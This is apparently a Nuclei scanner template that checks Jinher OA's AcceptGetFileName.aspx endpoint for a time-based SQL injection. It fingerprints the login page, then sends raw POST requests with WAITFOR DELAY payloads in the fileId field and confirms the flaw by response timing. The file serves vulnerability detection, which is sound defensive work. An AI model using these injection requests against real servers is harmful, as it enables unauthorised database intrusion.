id: poc-yaml-jinher-acceptgetfilename-sqli
info:
  name: 金和OA AcceptGetFileName.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA

flow: http(1) && http(2)

http:
  - id: step-1
    method: GET
    path:
      - '{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx'
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'JHSoft'

  - id: step-2
    raw:
      - |
        POST /c6/Jhsoft.Web.Accept/AcceptGetFileName.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        fileId=-1)WAITFOR DELAY '0:0:5'--
      - |
        POST /c6/Jhsoft.Web.Accept/AcceptGetFileName.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        fileId=-1)WAITFOR DELAY '0:0:8'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'D:\\JINHER\\upload\\Resource'
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
